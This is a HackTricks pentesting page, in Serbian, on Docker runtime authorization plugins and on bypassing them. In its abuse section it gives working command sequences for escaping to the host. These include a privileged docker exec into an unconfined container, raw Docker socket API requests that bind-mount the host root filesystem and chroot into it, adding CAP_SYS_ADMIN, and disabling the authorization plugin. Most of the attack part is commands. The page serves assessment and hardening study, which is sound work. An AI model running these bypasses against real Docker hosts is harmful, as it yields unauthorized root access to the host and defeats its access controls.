# Runtime autorizacioni pluginovi

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Runtime autorizacioni pluginovi predstavljaju dodatni sloj politike koji odlučuje da li pozivalac sme da izvrši određenu akciju daemona. Docker je klasičan primer. Po defaultu, bilo ko ko može da komunicira sa Docker daemon-om praktično ima široku kontrolu nad njim. Authorization plugins pokušavaju da suze taj model tako što ispituju autentifikovanog korisnika i traženu API operaciju, i zatim dopuštaju ili odbijaju zahtev u skladu sa politikom.

Ova tema zaslužuje posebnu stranicu jer menja model eksploatacije kada napadač već ima pristup Docker API-ju ili korisniku u `docker` grupi. U takvim okruženjima pitanje više nije samo "mogu li da dođem do demona?" već i "da li je daemon ograničen autorizacionim slojem, i ako jeste, može li se taj sloj zaobići kroz neobrađene endpoint-e, slabo JSON parsiranje, ili dozvole za upravljanje plugin-ovima?"

## Operacija

Kada zahtev stigne do Docker daemona, autorizacioni subsistem može proslediti kontekst zahteva jednom ili više instaliranih plugin-ova. Plugin vidi identitet autentifikovanog korisnika, detalje zahteva, odabrane header-e i delove tela zahteva ili odgovora kada je content type odgovarajući. Više plugin-ova može biti spojeno u lanac, i pristup se dodeljuje samo ako svi plugin-ovi dozvole zahtev.

Ovaj model zvuči snažno, ali njegova bezbednost u potpunosti zavisi od toga koliko je autor politike razumeo API. Plugin koji blokira `docker run --privileged` ali ignoriše `docker exec`, propušta alternativne JSON ključeve kao što je top-level `Binds`, ili dozvoljava administraciju plugin-ova može stvoriti lažni osećaj ograničenja dok i dalje ostavlja direktne puteve za eskalaciju privilegija otvorene.

## Uobičajene mete za plugin-ove

Važne oblasti za pregled politike su:

- container creation endpoints
- `HostConfig` polja kao što su `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, i opcije deljenja namespace-a
- `docker exec` ponašanje
- plugin management endpoints
- bilo koji endpoint koji može indirektno pokrenuti runtime akcije izvan predviđenog modela politike

Istorijski, primeri kao Twistlock-ov `authz` plugin i jednostavni edukativni plugin-ovi kao `authobot` olakšali su proučavanje ovog modela jer su njihovi policy fajlovi i kod pokazivali kako je mapiranje endpoint-a na akcije zaista implementirano. Za assessment rad, važna lekcija je da autor politike mora da razume punu površinu API-ja a ne samo najvidljivije CLI komande.

## Abuz

Prvi cilj je saznati šta je zapravo blokirano. Ako daemon odbije akciju, greška često leak-uje ime plugina, što pomaže da se identifikuje kontrola u upotrebi:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Ako vam treba šire profilisanje endpointa, alati kao što je `docker_auth_profiler` su korisni jer automatizuju inače repetitivan zadatak proveravanja koje API rute i JSON strukture su zaista dozvoljene od strane plugina.

Ako okruženje koristi prilagođeni plugin i možete da komunicirate sa API-jem, izlistajte koja polja objekta su zaista filtrirana:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ove provere su važne zato što su mnogi neuspehi autorizacije specifični za polja, a ne za koncepte. Plugin može odbiti CLI obrazac bez potpunog blokiranja ekvivalentne API strukture.

### Potpun primer: `docker exec` dodaje privilegije nakon kreiranja kontejnera

Politika koja blokira kreiranje privilegovanih kontejnera, ali dozvoljava kreiranje unconfined kontejnera uz `docker exec`, i dalje se može zaobići:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Ako daemon prihvati drugi korak, korisnik je povratio privilegovani interaktivni proces unutar container-a za koji je autor politike smatrao da je ograničen.

### Potpun primer: Bind Mount Through Raw API

Neke pokvarene politike proveravaju samo jedan JSON oblik. Ako root filesystem bind mount nije dosledno blokiran, host se i dalje može mountovati:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Ista ideja se može pojaviti i pod `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
### Potpun primer: Unchecked Capability Attribute

Posledica je potpuni izlazak iz fajl-sistema hosta. Zanimljivo je što zaobilaženje proističe iz nepotpunog pokrivanja politike, a ne iz buga u kernelu.

Ako politika zaboravi da filtrira atribut vezan za capability, napadač može da kreira container koji ponovo stiče opasnu capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Kada je prisutan `CAP_SYS_ADMIN` ili neka slična snažna capability, mnoge breakout techniques opisane u [capabilities.md](protections/capabilities.md) i [privileged-containers.md](privileged-containers.md) postaju izvodljive.

### Potpun primer: Onemogućavanje plugina

Ako su operacije za upravljanje pluginom dozvoljene, najčistiji bypass može biti potpuno isključivanje kontrole:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Ovo je greška u politici na nivou kontrolne ravni. Sloj autorizacije postoji, ali korisnik kojeg je trebalo ograničiti i dalje ima dozvolu da ga onemogući.

## Provere

Ove komande služe za utvrđivanje da li sloj politike postoji i da li deluje potpun ili površinski.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
What is interesting here:

- Poruke odbijanja koje sadrže ime plugina potvrđuju postojanje sloja autorizacije i često otkrivaju tačnu implementaciju.
- Lista plugina vidljiva napadaču može biti dovoljna da otkrije da li su operacije onemogućavanja ili ponovnog podešavanja moguće.
- Politika koja blokira samo očigledne CLI akcije, ali ne i sirove API zahteve, treba se smatrati zaobilaženom dok se ne dokaže suprotno.

## Podrazumevana podešavanja

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Nije omogućen po defaultu | Pristup daemonu je u praksi sve ili ništa, osim ako nije konfigurisan plugin za autorizaciju | nepotpuna politika plugina, korišćenje crnih lista umesto dozvoljenih listi, dozvoljavanje upravljanja pluginima, propusti na nivou polja |
| Podman | Not a common direct equivalent | Podman se obično više oslanja na Unix dozvole, izvršavanje bez roota i odluke o izlaganju API-ja nego na Docker-style authz plugins | široko izlaganje Podman API-ja koji radi kao root, slabe dozvole soketa |
| containerd / CRI-O | Different control model | Ovi runtimi obično se oslanjaju na dozvole soketa, granice poverenja čvora i kontrole orkestratora na višem nivou umesto na Docker authz plugine | montiranje soketa u workload-e, slabe pretpostavke o lokalnom poverenju čvora |
| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | Cluster RBAC i admission kontrole su glavni sloj politike | preširok RBAC, slaba admission politika, direktno izlaganje kubelet ili runtime API-ja |
